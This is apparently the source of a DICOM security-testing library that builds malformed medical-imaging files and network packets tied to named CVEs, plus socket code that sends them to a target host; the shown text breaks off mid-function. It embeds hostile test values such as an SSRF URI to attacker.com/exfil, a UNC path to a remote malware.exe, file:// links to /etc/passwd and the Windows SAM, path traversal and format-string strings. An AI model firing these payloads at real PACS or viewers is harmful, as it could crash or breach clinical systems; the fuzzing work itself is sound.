# SPDX-License-Identifier: GPL-2.0-only
"""
C-Scare Attack Patterns - Comprehensive DICOM Security Test Cases

Pre-built attack patterns derived from:
1. DICOM protocol specification edge cases
2. Real-world CVEs (2019-2024)
3. Fuzzer test cases

Attack Categories:
    ParserAttacks      - Target DICOM file/dataset parsers
    ProtocolAttacks    - Target network stack (PDUs, associations)
    MemoryAttacks      - Buffer overflows, allocation exhaustion
    LogicAttacks       - Semantic confusion, state violations
    StateMachineAttacks - DICOM state machine (Sta1-Sta13) violations
    CVEAttacks         - CVE-specific reproductions

CVE Coverage:
    CVE-2023-32135  - Use-After-Free in DCM parsing
    CVE-2024-24793  - Use-After-Free in File Meta Info
    CVE-2024-24794  - Use-After-Free in Sequence parsing
    CVE-2024-33606  - SSRF via URI Value Representation
    CVE-2019-11687  - Executable embedding (PEDICOM/ELFDICOM)
    CVE-2024-22100  - Heap-based buffer overflow
    CVE-2024-25578  - Out-of-bounds write
    CVE-2024-28877  - Stack-based buffer overflow

Example:
    from c_scare.attacks import ParserAttacks, CVEAttacks, ProtocolFuzzer
    
    # Generate test corpus
    corpus = ParserAttacks.generate_corpus('/output', count=100)
    
    # CVE-specific tests
    for attack in CVEAttacks.cve_2024_24793_duplicate_meta_tags():
        test_target(attack.payload)
    
    # Protocol fuzzing
    fuzzer = ProtocolFuzzer(('192.168.1.100', 11112))
    for result in fuzzer.fuzz_association(count=100):
        if result.interesting:
            save_for_analysis(result)
"""

from dataclasses import dataclass, field
from typing import Any, Dict, Generator, List, Optional, Tuple, Union
import random
import struct
import socket
import os
import time

from .element import Element, Dataset, Tag, VR
from .corruptor import Corruptor, Override, Injection, InjectionPoint
from .pixel import EncapsulatedPixelData, Fragment
from .file import DicomFile, TransferSyntax

# Scapy imports - may not be available in all environments
try:
    from .scapy_dicom import (
        DICOM, A_ASSOCIATE_RQ, A_ASSOCIATE_AC, A_ASSOCIATE_RJ,
        P_DATA_TF, A_RELEASE_RQ, A_RELEASE_RP, A_ABORT,
        C_ECHO_RQ, C_ECHO_RSP, C_STORE_RQ, C_FIND_RQ, C_MOVE_RQ,
        PresentationDataValueItem, DICOMSocket,
        DICOMVariableItem, DICOMApplicationContext, DICOMUserInformation,
        DICOMPresentationContextRQ, DICOMAbstractSyntax, DICOMTransferSyntax,
        DICOMMaximumLength, DICOMImplementationClassUID,
        build_presentation_context_rq, build_user_information,
        DEFAULT_TRANSFER_SYNTAX_UID, VERIFICATION_SOP_CLASS_UID,
        CT_IMAGE_STORAGE_SOP_CLASS_UID, IMPLEMENTATION_CLASS_UID,
        MR_IMAGE_STORAGE_SOP_CLASS_UID, SECONDARY_CAPTURE_SOP_CLASS_UID,
        _uid_to_bytes,
    )
    SCAPY_DICOM_AVAILABLE = True
except Exception:
    SCAPY_DICOM_AVAILABLE = False
    DEFAULT_TRANSFER_SYNTAX_UID = '1.2.840.10008.1.2'
    VERIFICATION_SOP_CLASS_UID = '1.2.840.10008.1.1'
    CT_IMAGE_STORAGE_SOP_CLASS_UID = '1.2.840.10008.5.1.4.1.1.2'
    MR_IMAGE_STORAGE_SOP_CLASS_UID = '1.2.840.10008.5.1.4.1.1.4'
    SECONDARY_CAPTURE_SOP_CLASS_UID = '1.2.840.10008.5.1.4.1.1.7'
    IMPLEMENTATION_CLASS_UID = '1.2.3.4.5.6.7.8.9'

try:
    from scapy.packet import raw, fuzz, Packet
    from scapy.volatile import RandByte, RandShort, RandInt, RandString
    SCAPY_PACKET_AVAILABLE = True
except Exception:
    SCAPY_PACKET_AVAILABLE = False
    raw = bytes
    def fuzz(pkt): return pkt

SCAPY_AVAILABLE = SCAPY_DICOM_AVAILABLE and SCAPY_PACKET_AVAILABLE

__all__ = [
    'AttackResult',
    # Attack pattern classes
    'ParserAttacks',
    'ProtocolAttacks',
    'MemoryAttacks',
    'LogicAttacks',
    'StateMachineAttacks',
    'CVEAttacks',
    # Fuzzing infrastructure
    'ProtocolFuzzer',
    'TargetedFuzzer',
    'CombinedAttacks',
]


@dataclass
class AttackResult:
    """Result of an attack test."""
    name: str
    category: str
    payload: bytes
    description: str
    expected_behavior: str
    metadata: Dict[str, Any] = field(default_factory=dict)
    response: Optional[bytes] = None
    success: Optional[bool] = None
    
    @property
    def cve(self) -> Optional[str]:
        """Get CVE reference if present."""
        return self.metadata.get('cve')


# =============================================================================
# Parser Attacks - Target DICOM file/dataset parsers
# =============================================================================

class ParserAttacks:
    """
    Attacks targeting DICOM parsers (viewers, PACS, libraries).
    
    These generate malformed DICOM files/datasets that may crash or
    confuse parsers.
    """
    
    @staticmethod
    def invalid_vr(vr: str = 'XX') -> AttackResult:
        """Element with invalid VR code."""
        ds = Dataset() / Element.raw(
            tag=0x00100010,
            vr=vr,
            value=b'Test^Patient'
        )
        return AttackResult(
            name='invalid_vr',
            category='parser',
            payload=ds.encode(),
            description=f'PatientName with invalid VR "{vr}"',
            expected_behavior='Parser should reject or handle gracefully',
            metadata={'vr': vr}
        )
    
    @staticmethod
    def length_overflow(declared: int = 0xFFFFFFFF, actual: int = 10) -> AttackResult:
        """Length field larger than actual data."""
        ds = Dataset() / Element.raw(
            tag=0x00100010,
            vr='PN',
            length=declared,
            value=b'X' * actual
        )
        return AttackResult(
            name='length_overflow',
            category='parser',
            payload=ds.encode(),
            description=f'Declared length {declared:#x}, actual {actual}',
            expected_behavior='Parser should detect length mismatch',
            metadata={'declared': declared, 'actual': actual}
        )
    
    @staticmethod
    def length_underflow(declared: int = 1, actual: int = 1000) -> AttackResult:
        """Length field smaller than actual data."""
        ds = Dataset() / Element.raw(
            tag=0x00100010,
            vr='PN',
            length=declared,
            value=b'X' * actual
        )
        return AttackResult(
            name='length_underflow',
            category='parser',
            payload=ds.encode(),
            description=f'Declared length {declared}, actual {actual}',
            expected_behavior='Parser may read beyond declared boundary',
            metadata={'declared': declared, 'actual': actual}
        )
    
    @staticmethod
    def undefined_length_abuse() -> AttackResult:
        """Undefined length without proper delimitation."""
        data = struct.pack('<HH', 0x0010, 0x0010)  # Tag
        data += b'LO'  # VR
        data += b'\x00\x00'  # Reserved
        data += struct.pack('<I', 0xFFFFFFFF)  # Undefined length
        data += b'AAAA' * 100  # Data without delimiter
        
        return AttackResult(
            name='undefined_length_abuse',
            category='parser',
            payload=data,
            description='Undefined length without sequence delimiter',
            expected_behavior='Parser should timeout or reject',
        )
    
    @staticmethod
    def sequence_bomb(depth: int = 500) -> AttackResult:
        """Deeply nested sequences (stack overflow attempt)."""
        data = b''
        for _ in range(depth):
            data += struct.pack('<HH', 0x0040, 0xA730)  # Content Sequence
            data += b'SQ'
            data += b'\x00\x00'
            data += struct.pack('<I', 0xFFFFFFFF)  # Undefined length
            data += struct.pack('<HH', 0xFFFE, 0xE000)  # Item tag
            data += struct.pack('<I', 0xFFFFFFFF)  # Undefined length
        
        for _ in range(depth):
            data += struct.pack('<HH', 0xFFFE, 0xE00D)  # Item delim
            data += struct.pack('<I', 0)
            data += struct.pack('<HH', 0xFFFE, 0xE0DD)  # Sequence delim
            data += struct.pack('<I', 0)
        
        return AttackResult(
            name='sequence_bomb',
            category='parser',
            payload=data,
            description=f'Sequence nested {depth} levels deep',
            expected_behavior='Parser may stack overflow or hang',
            metadata={'depth': depth, 'cve': 'CVE-2024-28877'}
        )
    
    @staticmethod
    def tag_out_of_order() -> AttackResult:
        """Tags not in ascending order."""
        ds = Dataset()
        ds._force_append(Element(0x0020, 0x000D, 'UI', '1.2.3'))  # Study UID
        ds._force_append(Element(0x0010, 0x0010, 'PN', 'Doe^John'))  # Patient Name
        
        return AttackResult(
            name='tag_out_of_order',
            category='parser',
            payload=ds.encode(),
            description='Tags in descending order',
            expected_behavior='Parser should reject or sort',
        )
    
    @staticmethod
    def duplicate_tag() -> AttackResult:
        """Same tag appears twice. CVE-2024-24793 variant."""
        ds = Dataset()
        ds._force_append(Element(0x0010, 0x0010, 'PN', 'Doe^John'))
        ds._force_append(Element(0x0010, 0x0010, 'PN', 'Evil^Patient'))
        
        return AttackResult(
            name='duplicate_tag',
            category='parser',
            payload=ds.encode(),
            description='PatientName appears twice',
            expected_behavior='Parser behavior undefined - may use either',
            metadata={'cve': 'CVE-2024-24793'}
        )
    
    @staticmethod
    def null_in_string() -> AttackResult:
        """Null bytes embedded in string value."""
        ds = Dataset() / Element(0x0010, 0x0010, 'PN', 'Doe\x00^John\x00\x00')
        
        return AttackResult(
            name='null_in_string',
            category='parser',
            payload=ds.encode(),
            description='Null bytes in PatientName',
            expected_behavior='Parser may truncate or include nulls',
        )
    
    @staticmethod
    def format_string_injection() -> AttackResult:
        """Format string patterns in string VR. CVE-2024-28877 variant."""
        ds = Dataset()
        ds = ds / Element(0x0008, 0x1030, 'LO', '%s%s%s%s%s%s%s%s%n')  # Study Description
        ds = ds / Element(0x0010, 0x0010, 'PN', '%x%x%x%x%x%x%x%x')  # Patient Name
        
        return AttackResult(
            name='format_string_injection',
            category='parser',
            payload=ds.encode(),
            description='Format string patterns in string tags',
            expected_behavior='Parser should not interpret as format strings',
            metadata={'cve': 'CVE-2024-28877'}
        )
    
    @staticmethod
    def path_traversal_in_string() -> AttackResult:
        """Path traversal patterns in string VR."""
        ds = Dataset()
        ds = ds / Element(0x0008, 0x1010, 'SH', '../../../etc/passwd')  # Station Name
        ds = ds / Element(0x0010, 0x0010, 'PN', '..\\..\\..\\Windows\\System32')
        
        return AttackResult(
            name='path_traversal_in_string',
            category='parser',
            payload=ds.encode(),
            description='Path traversal sequences in string tags',
            expected_behavior='Parser should sanitize paths',
            metadata={'cve': 'CVE-2024-28877'}
        )
    
    @staticmethod
    def unicode_expansion() -> AttackResult:
        """Short UTF-8 that expands to long UTF-16."""
        # UTF-8 sequences that expand significantly
        value = '\u0100' * 1000  # Each char is 2 bytes UTF-8, 2 bytes UTF-16
        ds = Dataset() / Element(0x0010, 0x0010, 'PN', value)
        
        return AttackResult(
            name='unicode_expansion',
            category='parser',
            payload=ds.encode(),
            description='Unicode that may expand during conversion',
            expected_behavior='Parser should handle encoding safely',
            metadata={'cve': 'CVE-2024-28877'}
        )
    
    @staticmethod
    def generate_corpus(output_dir: str, count: int = 100) -> List[AttackResult]:
        """Generate fuzzing corpus of malformed DICOM files."""
        os.makedirs(output_dir, exist_ok=True)
        results = []
        
        attacks = [
            ('invalid_vr_XX', lambda: ParserAttacks.invalid_vr('XX')),
            ('invalid_vr_00', lambda: ParserAttacks.invalid_vr('\x00\x00')),
            ('length_overflow', lambda: ParserAttacks.length_overflow()),
            ('length_underflow', lambda: ParserAttacks.length_underflow()),
            ('undefined_length', ParserAttacks.undefined_length_abuse),
            ('sequence_bomb_10', lambda: ParserAttacks.sequence_bomb(10)),
            ('sequence_bomb_100', lambda: ParserAttacks.sequence_bomb(100)),
            ('tag_out_of_order', ParserAttacks.tag_out_of_order),
            ('duplicate_tag', ParserAttacks.duplicate_tag),
            ('null_in_string', ParserAttacks.null_in_string),
            ('format_string', ParserAttacks.format_string_injection),
            ('path_traversal', ParserAttacks.path_traversal_in_string),
        ]
        
        for name, attack_fn in attacks:
            if len(results) >= count:
                break
            result = attack_fn()
            filepath = os.path.join(output_dir, f'{name}.dcm')
            
            file_data = b'\x00' * 128 + b'DICM' + result.payload
            
            with open(filepath, 'wb') as f:
                f.write(file_data)
            
            result.metadata['filepath'] = filepath
            results.append(result)
        
        return results


# =============================================================================
# Protocol Attacks - Target DICOM network stack
# =============================================================================

class ProtocolAttacks:
    """
    Attacks targeting DICOM network protocol.
    
    Uses Scapy packets for full protocol control when available.
    """
    
    @staticmethod
    def malformed_protocol_version(version: int = 0xFFFF) -> bytes:
        """A-ASSOCIATE-RQ with invalid protocol version."""
        if not SCAPY_AVAILABLE:
            # Build manually
            return b'\x01\x00' + struct.pack('!I', 68) + struct.pack('!H', version) + b'\x00' * 66
        
        pkt = DICOM() / A_ASSOCIATE_RQ(
            protocol_version=version,
            called_ae_title='TARGET',
            calling_ae_title='ATTACKER',
        )
        return raw(pkt)
    
    @staticmethod
    def oversized_pdu(size: int = 0x100000) -> bytes:
        """PDU with declared length far exceeding data."""
        header = struct.pack('!BBL', 0x01, 0x00, size)
        body = b'X' * 100
        return header + body
    
    @staticmethod
    def undersized_pdu() -> bytes:
        """PDU with declared length smaller than data."""
        header = struct.pack('!BBL', 0x01, 0x00, 10)
        body = b'X' * 1000
        return header + body
    
    @staticmethod
    def invalid_pdu_type(pdu_type: int = 0xFF) -> bytes:
        """PDU with unknown type code."""
        return struct.pack('!BBL', pdu_type, 0x00, 4) + b'\x00' * 4
    
    @staticmethod
    def truncated_association() -> bytes:
        """A-ASSOCIATE-RQ truncated mid-packet."""
        if not SCAPY_AVAILABLE:
            full = b'\x01\x00' + struct.pack('!I', 68) + b'\x00' * 68
        else:
            pkt = DICOM() / A_ASSOCIATE_RQ()
            full = raw(pkt)
        return full[:len(full) // 2]
    
    @staticmethod
    def pdata_without_association() -> bytes:
        """P-DATA-TF sent without prior association."""
        if not SCAPY_AVAILABLE:
            # Minimal P-DATA-TF
            return b'\x04\x00' + struct.pack('!I', 20) + b'\x00' * 20
        
        cmd = C_ECHO_RQ(message_id=1)
        pdv = PresentationDataValueItem(
            presentation_context_id=1,
            message_control_header=0x03,
            data=raw(cmd),
        )
        pkt = DICOM() / P_DATA_TF(pdv_items=[pdv])
        return raw(pkt)
    
    @staticmethod
    def double_association() -> Tuple[bytes, bytes]:
        """Two A-ASSOCIATE-RQ packets (second should fail)."""
        if not SCAPY_AVAILABLE:
            pdu = b'\x01\x00' + struct.pack('!I', 68) + b'\x00' * 68
            return pdu, pdu
        
        pkt = DICOM() / A_ASSOCIATE_RQ(
            called_ae_title='TARGET',
            calling_ae_title='ATTACKER',
        )
        return raw(pkt), raw(pkt)
    
    @staticmethod
    def overlong_ae_title() -> bytes:
        """A-ASSOCIATE-RQ with AE title > 16 chars."""
        if not SCAPY_AVAILABLE:
            return b'\x01\x00' + struct.pack('!I', 68) + b'X' * 20 + b'\x00' * 48
        
        pkt = DICOM() / A_ASSOCIATE_RQ(
            called_ae_title=b'X' * 20,  # Should be max 16
            calling_ae_title='ATTACKER',
        )
        return raw(pkt)
    
    @staticmethod
    def null_ae_titles() -> bytes:
        """A-ASSOCIATE-RQ with null AE titles."""
        if not SCAPY_AVAILABLE:
            return b'\x01\x00' + struct.pack('!I', 68) + b'\x00' * 32 + b'\x00' * 36
        
        pkt = DICOM() / A_ASSOCIATE_RQ(
            called_ae_title=b'\x00' * 16,
            calling_ae_title=b'\x00' * 16,
        )
        return raw(pkt)
    
    @staticmethod
    def missing_application_context() -> bytes:
        """A-ASSOCIATE-RQ without Application Context item."""
        if not SCAPY_AVAILABLE:
            # Return minimal PDU
            return b'\x01\x00' + struct.pack('!I', 68) + b'\x00' * 68
        
        # Build with only presentation context (no app context)
        variable_items = [
            build_presentation_context_rq(1, VERIFICATION_SOP_CLASS_UID, [DEFAULT_TRANSFER_SYNTAX_UID]),
            build_user_information(max_pdu_length=16384),
        ]
        pkt = DICOM() / A_ASSOCIATE_RQ(
            called_ae_title='TARGET',
            calling_ae_title='ATTACKER',
            variable_items=variable_items,
        )
        return raw(pkt)
    
    @staticmethod
    def pdu_length_mismatch(inflate_by: int = 10000) -> bytes:
        """A-ASSOCIATE-RQ with length field inflated."""
        if not SCAPY_AVAILABLE:
            pdu = b'\x01\x00' + struct.pack('!I', 68) + b'\x00' * 68
        else:
            pkt = DICOM() / A_ASSOCIATE_RQ()
            pdu = raw(pkt)
        
        # Mutate length field
        actual_len = struct.unpack('!I', pdu[2:6])[0]
        mutated = pdu[:2] + struct.pack('!I', actual_len + inflate_by) + pdu[6:]
        return mutated
    
    @staticmethod
    def abort_injection() -> bytes:
        """A-ABORT packet for injecting mid-session."""
        if not SCAPY_AVAILABLE:
            return b'\x07\x00' + struct.pack('!I', 4) + b'\x00\x00\x00\x00'
        
        pkt = DICOM() / A_ABORT(source=0, reason=0)
        return raw(pkt)
    
    @staticmethod
    def wrong_context_id(context_id: int = 255) -> bytes:
        """P-DATA-TF with non-negotiated context ID."""
        if not SCAPY_AVAILABLE:
            return b'\x04\x00' + struct.pack('!I', 20) + bytes([context_id]) + b'\x00' * 19
        
        cmd = C_ECHO_RQ(message_id=1)
        pdv = PresentationDataValueItem(
            presentation_context_id=context_id,
            message_control_header=0x03,
            data=raw(cmd),
        )
        pkt = DICOM() / P_DATA_TF(pdv_items=[pdv])
        return raw(pkt)
    
    @staticmethod
    def invalid_command_field() -> bytes:
        """DIMSE command with invalid command field (0xDEAD)."""
        if not SCAPY_AVAILABLE:
            return b''
        
        cmd = C_STORE_RQ(
            affected_sop_class_uid=CT_IMAGE_STORAGE_SOP_CLASS_UID,
            affected_sop_instance_uid='1.2.3.4.5',
            message_id=1,
        )
        cmd.command_field = 0xDEAD  # Invalid!
        return raw(cmd)


# =============================================================================
# Memory Attacks - Buffer overflows, allocation exhaustion
# =============================================================================

class MemoryAttacks:
    """
    Attacks targeting memory handling vulnerabilities.
    
    CVE Coverage:
        CVE-2024-22100 - Heap-based buffer overflow
        CVE-2024-25578 - Out-of-bounds write
        CVE-2024-28877 - Stack-based buffer overflow
    """
    
    @staticmethod
    def pixel_dimension_overflow() -> AttackResult:
        """Rows/Columns set to cause integer overflow."""
        ds = Dataset()
        ds = ds / Element(0x0028, 0x0010, 'US', struct.pack('<H', 0xFFFF))  # Rows
        ds = ds / Element(0x0028, 0x0011, 'US', struct.pack('<H', 0xFFFF))  # Columns
        ds = ds / Element(0x0028, 0x0100, 'US', struct.pack('<H', 32))      # Bits Alloc
        ds = ds / Element(0x7FE0, 0x0010, 'OW', b'\x00' * 100)              # Small pixel data
        
        return AttackResult(
            name='pixel_dimension_overflow',
            category='memory',
            payload=ds.encode(),
            description='65535x65535 pixels with 32-bit allocation',
            expected_behavior='May cause integer overflow in size calc',
            metadata={'cve': 'CVE-2024-22100'}
        )
    
    @staticmethod
    def fragment_count_bomb() -> AttackResult:
        """Encapsulated pixel data with huge number of fragments."""
        pixel = EncapsulatedPixelData(transfer_syntax='1.2.840.10008.1.2.4.50')
        
        for i in range(10000):
            pixel.add_fragment(b'\xFF\xD8\xFF\xE0')
        
        return AttackResult(
            name='fragment_count_bomb',
            category='memory',
            payload=pixel.encode(),
            description='10,000 pixel fragments',
            expected_behavior='May exhaust memory tracking fragments',
            metadata={'cve': 'CVE-2024-22100'}
        )
    
    @staticmethod
    def offset_table_bomb() -> AttackResult:
        """Basic offset table with misleading offsets."""
        num_offsets = 1000
        offset_table = struct.pack('<I', num_offsets * 4)
        for i in range(num_offsets):
            offset_table += struct.pack('<I', i * 0x10000000)
        
        data = struct.pack('<HH', 0x7FE0, 0x0010)  # Pixel Data tag
        data += b'OW'
        data += b'\x00\x00'
        data += struct.pack('<I', 0xFFFFFFFF)  # Undefined length
        data += struct.pack('<HH', 0xFFFE, 0xE000)  # Item tag
        data += offset_table
        
        return AttackResult(
            name='offset_table_bomb',
            category='memory',
            payload=data,
            description=f'{num_offsets} fragment offsets pointing to huge addresses',
            expected_behavior='Parser may allocate or seek to huge addresses',
            metadata={'cve': 'CVE-2024-25578'}
        )
    
    @staticmethod
    def value_multiplicity_bomb() -> AttackResult:
        """Element with extreme value multiplicity."""
        value = '\\'.join(['X'] * 100000)
        ds = Dataset() / Element(0x0008, 0x0018, 'UI', value)
        
        return AttackResult(
            name='value_multiplicity_bomb',
            category='memory',
            payload=ds.encode(),
            description='SOP Instance UID with 100,000 values',
            expected_behavior='Parser may allocate huge string array',
            metadata={'cve': 'CVE-2024-22100'}
        )
    
    @staticmethod
    def oversized_string_vr(size: int = 0x10000) -> AttackResult:
        """String VR exceeding normal limits. CVE-2024-22100."""
        ds = Dataset()
        ds = ds / Element(0x0010, 0x0010, 'PN', 'A' * size)  # Patient Name
        
        return AttackResult(
            name='oversized_string_vr',
            category='memory',
            payload=ds.encode(),
            description=f'Patient Name with {size} bytes',
            expected_behavior='Parser should handle or reject gracefully',
            metadata={'cve': 'CVE-2024-22100', 'size': size}
        )
    
    @staticmethod
    def maximum_length_field() -> AttackResult:
        """Element with 0xFFFFFFFF length."""
        ds = Dataset() / Element.raw(
            tag=0x00100010,
            vr='PN',
            length=0xFFFFFFFF,
            value=b'Test'
        )
        
        return AttackResult(
            name='maximum_length_field',
            category='memory',
            payload=ds.encode(),
            description='Element with maximum possible length declaration',
            expected_behavior='Parser should detect impossibility',
            metadata={'cve': 'CVE-2024-22100'}
        )
    
    @staticmethod
    def ob_vr_overflow() -> AttackResult:
        """OB (Other Byte) VR with data exceeding declared length."""
        data = struct.pack('<HH', 0x7FE0, 0x0010)  # Pixel Data
        data += b'OB'
        data += b'\x00\x00'
        data += struct.pack('<I', 100)  # Declare 100 bytes
        data += b'X' * 10000  # But provide 10000
        
        return AttackResult(
            name='ob_vr_overflow',
            category='memory',
            payload=data,
            description='OB value exceeds declared length',
            expected_behavior='Parser should stop at declared length',
            metadata={'cve': 'CVE-2024-25578'}
        )
    
    @staticmethod
    def ow_vr_overflow() -> AttackResult:
        """OW (Other Word) VR with excessive data."""
        data = struct.pack('<HH', 0x7FE0, 0x0010)  # Pixel Data
        data += b'OW'
        data += b'\x00\x00'
        data += struct.pack('<I', 100)  # Declare 100 bytes
        data += b'\x00\xFF' * 5000  # 10000 bytes of 16-bit words
        
        return AttackResult(
            name='ow_vr_overflow',
            category='memory',
            payload=data,
            description='OW value exceeds declared length',
            expected_behavior='Parser should stop at declared length',
            metadata={'cve': 'CVE-2024-25578'}
        )
    
    @staticmethod
    def lut_overflow() -> AttackResult:
        """Lookup Table data exceeding bounds."""
        ds = Dataset()
        # LUT Descriptor: entries, first value, bits stored
        ds = ds / Element(0x0028, 0x1101, 'US', struct.pack('<HHH', 256, 0, 16))
        # LUT Data - way more than 256 entries
        ds = ds / Element(0x0028, 0x1201, 'OW', b'\x00\x01' * 10000)
        
        return AttackResult(
            name='lut_overflow',
            category='memory',
            payload=ds.encode(),
            description='LUT data far exceeds descriptor count',
            expected_behavior='Parser should validate LUT size',
            metadata={'cve': 'CVE-2024-25578'}
        )
    
    @staticmethod
    def encapsulated_frame_overflow() -> AttackResult:
        """JPEG frame with invalid length markers."""
        # Fake JPEG with oversized APP0 marker
        fake_jpeg = b'\xFF\xD8'  # SOI
        fake_jpeg += b'\xFF\xE0'  # APP0
        fake_jpeg += struct.pack('>H', 0xFFFF)  # Maximum segment length
        fake_jpeg += b'JFIF\x00' + b'X' * 100  # Much less than declared
        fake_jpeg += b'\xFF\xD9'  # EOI
        
        pixel = EncapsulatedPixelData(transfer_syntax='1.2.840.10008.1.2.4.50')
        pixel.add_fragment(fake_jpeg)
        
        return AttackResult(
            name='encapsulated_frame_overflow',
            category='memory',
            payload=pixel.encode(),
            description='JPEG with oversized segment length',
            expected_behavior='JPEG decoder should handle gracefully',
            metadata={'cve': 'CVE-2024-25578'}
        )


# =============================================================================
# Logic Attacks - Semantic confusion, state violations
# =============================================================================

class LogicAttacks:
    """
    Attacks targeting DICOM semantic/logic layer.
    """
    
    @staticmethod
    def transfer_syntax_mismatch() -> AttackResult:
        """File declares one transfer syntax but uses another encoding."""
        meta = Dataset()
        meta / Element(0x0002, 0x0010, 'UI', '1.2.840.10008.1.2.1')  # Explicit LE
        
        # But encode dataset as implicit VR
        data_implicit = struct.pack('<HH', 0x0010, 0x0010)  # Tag only
        data_implicit += struct.pack('<I', 8)
        data_implicit += b'Doe^John'
        
        file_data = b'\x00' * 128 + b'DICM'
        file_data += meta.encode()
        file_data += data_implicit
        
        return AttackResult(
            name='transfer_syntax_mismatch',
            category='logic',
            payload=file_data,
            description='Meta says Explicit VR, data is Implicit VR',
            expected_behavior='Parser should detect encoding mismatch',
        )
    
    @staticmethod
    def sop_class_mismatch() -> AttackResult:
        """SOP Class UID doesn't match actual content."""
        ds = Dataset()
        ds = ds / Element(0x0008, 0x0016, 'UI', CT_IMAGE_STORAGE_SOP_CLASS_UID)
        ds = ds / Element(0x0010, 0x0010, 'PN', 'Doe^John')
        # No actual CT-required elements
        
        return AttackResult(
            name='sop_class_mismatch',
            category='logic',
            payload=ds.encode(),
            description='Claims CT Image but missing CT elements',
            expected_behavior='Validator should reject',
        )
    
    @staticmethod
    def private_creator_missing() -> AttackResult:
        """Private tag without corresponding private creator."""
        ds = Dataset()
        ds = ds / Element(0x0010, 0x0010, 'PN', 'Doe^John')
        ds = ds / Element.raw(tag=0x00091001, vr='LO', value=b'PrivateData')
        
        return AttackResult(
            name='private_creator_missing',
            category='logic',
            payload=ds.encode(),
            description='Private tag (0009,1001) without (0009,0010) creator',
            expected_behavior='Parser may misinterpret VR',
        )
    
    @staticmethod
    def uri_ssrf(url: str = 'http://attacker.com/exfil') -> AttackResult:
        """
        URI injection for SSRF. CVE-2024-33606.
        
        DICOM supports URI-type Value Representations (VR=UR) that some
        viewers may follow without authorization checks.
        """
        ds = Dataset()
        ds = ds / Element(0x0008, 0x1190, 'UR', url)  # Retrieve URI
        
        return AttackResult(
            name='uri_ssrf',
            category='logic',
            payload=ds.encode(),
            description=f'URI tag pointing to {url}',
            expected_behavior='Viewer should not auto-fetch without auth',
            metadata={'cve': 'CVE-2024-33606', 'url': url}
        )
    
    @staticmethod
    def file_uri_injection() -> AttackResult:
        """file:// protocol injection. CVE-2024-33606."""
        ds = Dataset()
        ds = ds / Element(0x0008, 0x1190, 'UR', 'file:///etc/passwd')
        ds = ds / Element(0x0040, 0xE010, 'UR', 'file:///C:/Windows/System32/config/SAM')
        
        return AttackResult(
            name='file_uri_injection',
            category='logic',
            payload=ds.encode(),
            description='file:// URIs in UR tags',
            expected_behavior='Viewer should block file:// protocol',
            metadata={'cve': 'CVE-2024-33606'}
        )
    
    @staticmethod
    def unc_path_injection() -> AttackResult:
        """UNC path injection. CVE-2024-33606."""
        ds = Dataset()
        ds = ds / Element(0x0008, 0x1190, 'UR', '\\\\attacker.com\\share\\malware.exe')
        
        return AttackResult(
            name='unc_path_injection',
            category='logic',
            payload=ds.encode(),
            description='UNC path in URI tag',
            expected_behavior='Viewer should block UNC paths',
            metadata={'cve': 'CVE-2024-33606'}
        )
    
    @staticmethod
    def data_uri_script() -> AttackResult:
        """data: URI with script. CVE-2024-33606."""
        ds = Dataset()
        ds = ds / Element(0x0008, 0x1190, 'UR', 'data:text/html,<script>alert(1)</script>')
        
        return AttackResult(
            name='data_uri_script',
            category='logic',
            payload=ds.encode(),
            description='data: URI with script in UR tag',
            expected_behavior='Viewer should not execute data: URIs',
            metadata={'cve': 'CVE-2024-33606'}
        )


# =============================================================================
# State Machine Attacks - DICOM state machine (Sta1-Sta13) violations
# =============================================================================

class StateMachineAttacks:
    """
    Attacks targeting the DICOM state machine (PS3.8 Chapter 9).
    
    Tests sending unexpected PDUs in wrong states.
    """
    
    def __init__(self, target: Tuple[str, int]):
        """Initialize with target (host, port)."""
        self.target = target
    
    def _connect(self) -> socket.socket:
        """Create connected socket."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5.0)
        sock.connect(self.target)
        return sock
    
    def _recv(self, sock: socket.socket) -> Optional[bytes]:
        """Receive with timeout."""
        try:
            return sock.recv(65536)
        except socket.timeout:
            return None
    
    def pdata_before_assoc(self) -> AttackResult:
        """P-DATA-TF before association (Sta1 violation)."""
        pdu_bytes = ProtocolAttacks.pdata_without_association()
        
        try:
            sock = self._connect()
            sock.sendall(pdu_bytes)
            response = self._recv(sock)
            sock.close()
            
            return AttackResult(
                name='pdata_before_assoc',
                category='state_machine',
                payload=pdu_bytes,
                description='P-DATA-TF in Sta1 (should only accept A-ASSOCIATE-RQ)',
                expected_behavior='Target should abort or ignore',
                response=response,
                success=True,
            )
        except Exception as e:
            return AttackResult(
                name='pdata_before_assoc',
                category='state_machine',
                payload=pdu_bytes,
                description=f'Failed: {e}',
                expected_behavior='N/A',
                success=False,
            )
    
    def release_before_assoc(self) -> AttackResult:
        """A-RELEASE-RQ before association."""
        if not SCAPY_AVAILABLE:
            pdu_bytes = b'\x05\x00' + struct.pack('!I', 4) + b'\x00' * 4
        else:
            pkt = DICOM() / A_RELEASE_RQ()
            pdu_bytes = raw(pkt)
        
        try:
            sock = self._connect()
            sock.sendall(pdu_bytes)
            response = self._recv(sock)
            sock.close()
            
            return AttackResult(
                name='release_before_assoc',
                category='state_machine',
                payload=pdu_bytes,
                description='A-RELEASE-RQ in Sta1',
                expected_behavior='Target should abort',
                response=response,
                success=True,
            )
        except Exception as e:
            return AttackResult(
                name='release_before_assoc',
                category='state_machine',
                payload=pdu_bytes,
                description=f'Failed: {e}',
                expected_behavior='N/A',
                success=False,
            )
    
    def double_association(self) -> AttackResult:
        """Two A-ASSOCIATE-RQ (second should fail)."""
        pdu1, pdu2 = ProtocolAttacks.double_association()
        
        try:
            sock = self._connect()
            sock.sendall(pdu1)
            resp1 = self._recv(sock)
            sock.sendall(pdu2)
            resp2 = self._recv(sock)
            sock.close()
            
            return AttackResult(
                name='double_association',
                category='state_machine',
                payload=pdu1 + pdu2,
                description='Second A-ASSOCIATE-RQ in Sta6',
                expected_behavior='Target should abort on second RQ',
                response=resp2,
                metadata={'first_response': resp1},
                success=True,
            )
        except Exception as e:
            return AttackResult(
                name='double_association',
                category='state_machine',
                payload=pdu1,
                description=f'Failed: {e}',
                expected_behavior='N/A',
                success=False,
            )
    
    def release_then_pdata(self) -> AttackResult:
        """A-RELEASE-RQ followed by P-DATA-TF."""
        assoc_pdu, _ = ProtocolAttacks.double_association()
        
        if not SCAPY_AVAILABLE:
            release_pdu = b'\x05\x00' + struct.pack('!I', 4) + b'\x00' * 4
            pdata_pdu = b'\x04\x00' + struct.pack('!I', 20) + b'\x00' * 20
        else:
            release_pdu = raw(DICOM() / A_RELEASE_RQ())
